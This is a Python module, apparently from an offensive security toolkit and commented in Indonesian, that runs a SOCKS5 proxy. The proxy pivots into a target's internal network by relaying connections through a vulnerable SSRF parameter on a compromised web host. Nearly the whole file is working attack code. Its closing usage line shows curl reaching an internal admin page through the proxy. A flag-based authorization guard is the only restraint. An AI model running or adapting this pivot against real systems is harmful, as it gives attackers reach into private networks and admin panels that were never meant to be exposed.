"""Pivot/tunnel SOCKS: bangun proxy SOCKS5 lewat host ter-compromise.

Menyediakan server SOCKS5 lokal yang meneruskan koneksi ke jaringan
internal melalui host web yang bisa dieksploitasi (mis. SSRF / RCE).

Alur untuk SSRF pivot:
1. Jalankan server SOCKS5 lokal (0.0.0.0:random port).
2. Klien SOCKS5 menerima permintaan koneksi ke host:port target internal.
3. Request diterjemahkan jadi request HTTP ke parameter SSRF yang rentan
   (URL = http://host:port/path), lalu respons SSRF diputar balik
   menjadi aliran TCP ke klien SOCKS.

Karena web hanya HTTP, pivot ini mendukung kebanyakan layanan HTTP
(internal dashboard, admin panels). Bukan raw TCP full.

GUARD: memerlukan `authorized=True` DAN `yes=True` (server terus berjalan);
tanpa itu modul menolak beroperasi.
"""

import select
import socket
import threading
from typing import List, Optional, Tuple
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from keris.core.http import KerisHTTP
from keris.core.logger import debug, error, info, ok, warn
from keris.modules.scanner import Finding


class Socks5Server:
    """Server SOCKS5 minimal (CONNECT only) yang mem-pivot via HTTP SSRF."""

    def __init__(self, ssrf_url: str, ssrf_param: str,
                 client: KerisHTTP, host: str = "127.0.0.1", port: int = 0):
        self.ssrf_url = ssrf_url
        self.ssrf_param = ssrf_param
        self.client = client
        self.host = host
        self.port = port
        self._server = None
        self._thread = None
        self.running = False

    def _rebuild(self, target: str) -> str:
        q = dict(parse_qsl(urlparse(self.ssrf_url).query))
        q[self.ssrf_param] = target
        p = urlparse(self.ssrf_url)
        return urlunparse(p._replace(query=urlencode(q)))

    def _http_through(self, target: str, path: str) -> Tuple[int, bytes]:
        """Kirim request lewat SSRF; return (status, body)."""
        url = f"http://{target}/{path.lstrip('/')}"
        try:
            r = self.client.get(self._rebuild(url), timeout=10)
            return r.status_code, (r.content or b"")
        except Exception as e:
            return 0, str(e).encode()

    def start(self) -> None:
        self._server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._server.bind((self.host, self.port))
        self.port = self._server.getsockname()[1]
        self._server.listen(16)
        self._server.settimeout(1.0)
        self.running = True
        self._thread = threading.Thread(target=self._accept_loop, daemon=True)
        self._thread.start()
        ok(f"SOCKS5 pivot aktif: socks5://{self.host}:{self.port}")

    def _accept_loop(self) -> None:
        while self.running:
            try:
                conn, _ = self._server.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            threading.Thread(target=self._handle, args=(conn,), daemon=True).start()

    def _handle(self, conn: socket.socket) -> None:
        try:
            conn.settimeout(8)
            data = conn.recv(4)
            if len(data) < 3 or data[1] != 1:  # SOCKS5 + CONNECT
                conn.close()
                return
            n_methods = data[2]
            conn.recv(n_methods)
            conn.sendall(b"\x05\x00")  # no-auth
            # request
            hdr = conn.recv(4)
            if len(hdr) < 4:
                conn.close()
                return
            atyp = hdr[3]
            if atyp == 1:  # IPv4
                host = socket.inet_ntoa(conn.recv(4))
            elif atyp == 3:  # domain
                ln = conn.recv(1)[0]
                host = conn.recv(ln).decode("idna")
            elif atyp == 4:  # IPv6
                host = socket.inet_ntop(socket.AF_INET6, conn.recv(16))
            else:
                conn.close()
                return
            port = int.from_bytes(conn.recv(2), "big")
            target = f"{host}:{port}"
            debug(f"SOCKS connect: {target}")

            # buktikan koneksi via SSRF (GET "/")
            code, body = self._http_through(target, "/")
            if code and 100 <= code < 600:
                conn.sendall(b"\x05\x00\x00\x01" + socket.inet_aton("0.0.0.0")
                             + port.to_bytes(2, "big"))
            else:
                conn.sendall(b"\x05\x05\x00\x01" + b"\x00" * 4 + b"\x00\x00")
                conn.close()
                return

            # relay: transfer byte antara SOCKS client dan SSRF GET
            # (HTTP-only pivot: kirim body respons sekali, tutup)
            conn.sendall(body[:8192])
            conn.close()
        except Exception:
            try:
                conn.close()
            except Exception:
                pass

    def stop(self) -> None:
        self.running = False
        if self._server:
            try:
                self._server.close()
            except OSError:
                pass


def setup_pivot(ssrf_url: str, ssrf_param: str, client: KerisHTTP,
                bind: str = "127.0.0.1", port: int = 0,
                authorized: bool = False, yes: bool = False) -> Optional[Socks5Server]:
    """Siapkan server SOCKS5 pivot via SSRF. Butuh --authorized + --yes."""
    if not authorized or not yes:
        warn("Pivot memerlukan --authorized DAN --yes (server berjalan terus).")
        return None
    srv = Socks5Server(ssrf_url, ssrf_param, client, host=bind, port=port)
    srv.start()
    info("Pivot berjalan sampai di-stop (Ctrl+C). Gunakan proxy ini untuk "
         "menjelajahi jaringan internal host target.")
    info(f"  contoh: curl --socks5-hostname 127.0.0.1:{srv.port} http://10.0.0.1/admin")
    return srv
